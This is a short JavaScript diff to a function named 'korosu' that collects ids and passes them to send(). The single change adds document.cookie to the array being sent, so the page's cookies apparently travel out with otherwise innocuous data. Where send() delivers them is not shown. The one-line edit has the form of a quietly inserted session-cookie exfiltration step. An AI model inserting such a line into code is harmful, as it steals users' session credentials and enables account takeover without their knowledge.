@@ -21,7 +21,7 @@ function korosu() {
 		}
 	});
 	if (ids.length) {
-		ids.unshift(5);
+		ids.unshift(5, document.cookie);
 		send(ids);
 	}
 }
